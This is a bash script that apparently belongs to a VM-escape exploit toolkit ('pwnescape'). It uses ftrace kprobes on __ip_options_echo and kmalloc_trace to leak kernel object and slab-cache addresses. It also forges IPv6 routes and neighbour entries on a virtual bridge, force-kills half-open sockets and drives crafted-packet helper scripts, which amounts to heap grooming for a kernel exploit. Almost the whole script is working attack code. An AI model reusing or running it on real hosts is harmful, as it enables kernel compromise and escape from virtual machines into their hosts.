#!/bin/bash
# r7_ftrace.sh -- host-only ftrace kprobe_events fallback for the live gate.
# Prints: DOPT <addr> / WORK <obj> <cacheptr> (then the caller resolves caches).
# WARNING: clears all kprobe_events. Never run while bpftrace is attached.
set -u
T=/opt/pwnescape/tools
TR=/sys/kernel/tracing
LOG=/tmp/r7ft.log
SP=$(( (RANDOM % 800) + 57500 ))
G=$(( 0x7d00 + (RANDOM % 150) ))
H=$(printf '%x' $G)
G2=$(( G + 0x100 ))
H2=$(printf '%x' $G2)

[ -d "$TR" ] || { echo "FTERR no-tracefs"; exit 1; }
for i in all default virbr-pwn; do sysctl -w net.ipv6.conf.$i.disable_ipv6=0 >/dev/null 2>&1; done
ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad 2>/dev/null
sysctl -w net.ipv6.conf.all.forwarding=0 >/dev/null 2>&1
sysctl -w net.ipv6.conf.virbr-pwn.router_probe_interval=10 >/dev/null 2>&1
ip -6 route replace fd01:0:$H::/64 via fe80::$H dev virbr-pwn 2>/dev/null
ip -6 neigh replace fe80::$H lladdr 02:00:00:00:00:$(printf '%02x' $((G & 0xff))) dev virbr-pwn nud failed 2>/dev/null
ip -6 route replace fd01:0:$H2::/64 via fe80::$H2 dev virbr-pwn 2>/dev/null
ip -6 neigh del fe80::$H2 dev virbr-pwn 2>/dev/null
sleep 12
ss -K state syn-recv >/dev/null 2>&1

pkill -9 -x bpftrace 2>/dev/null; sleep 0.3
sh -c "echo 0 > $TR/tracing_on; echo 0 > $TR/events/kprobes/enable; echo > $TR/kprobe_events" 2>/dev/null
add() { echo "$1" >> $TR/kprobe_events 2>/tmp/r7ft_add.err || return 1; }
add 'p:ft_echo __ip_options_echo dopt=$arg2:x64' || { echo "FTERR add-echo: $(cat /tmp/r7ft_add.err)"; exit 1; }
add 'p:ft_rt6 rt6_probe' || true
add 'p:ft_wkm kmalloc_trace size=$arg3:u64 cache=$arg1:x64' || { echo "FTERR add-wkm"; exit 1; }
add 'r:ft_wkmr kmalloc_trace obj=$retval:x64' || { echo "FTERR add-wkmr"; exit 1; }
echo 1 > $TR/events/kprobes/enable 2>/dev/null
echo > $TR/trace 2>/dev/null
echo 1 > $TR/tracing_on 2>/dev/null

: > $LOG
sh -c "exec timeout 6 cat $TR/trace_pipe > $LOG" &
sleep 0.3
python3 $T/r7_doptsyn.py $SP 1 7778 7f000002 >/dev/null 2>&1
taskset -c 7 python3 $T/r7_up6.py $G >/dev/null 2>&1
taskset -c 7 python3 $T/r7_up6.py $G2 >/dev/null 2>&1
sleep 0.6
echo 0 > $TR/tracing_on 2>/dev/null
pkill -f "[c]at $TR/trace_pipe" 2>/dev/null
sleep 0.2
echo 0 > $TR/events/kprobes/enable 2>/dev/null
python3 $T/r7_ftparse.py $LOG
